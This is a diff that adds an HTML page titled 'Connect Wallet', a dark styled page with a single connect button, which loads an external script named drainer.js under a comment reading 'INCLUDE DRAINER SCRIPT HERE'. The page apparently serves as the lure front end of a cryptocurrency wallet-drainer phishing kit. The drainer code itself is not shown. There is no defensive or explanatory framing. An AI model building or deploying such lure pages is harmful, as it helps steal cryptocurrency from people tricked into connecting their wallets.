@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+    <!-- Import generic font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+   body {
+    font-family: 'Inter', sans-serif;
+    background-color: #0f172a;
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+   }
+  .button {
+    padding: 15px 30px;
+    background-color: #f59e0b; /* Amber color */
+    color: white;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    transition: transform 0.2s;
+   }
+   .button:hover { transform: scale(1.05); }
+    </style>
+</head>
+<body>
+
+    <h1 style="margin-bottom: 20px;">Please Connect Wallet</h1>
+    <button class="button" id="connectWalletBtn">Connect Wallet</button>
+
+    <!-- INCLUDE DRAINER SCRIPT HERE -->
+    <script src="drainer.js"></script>
+
+</body>
+</html>
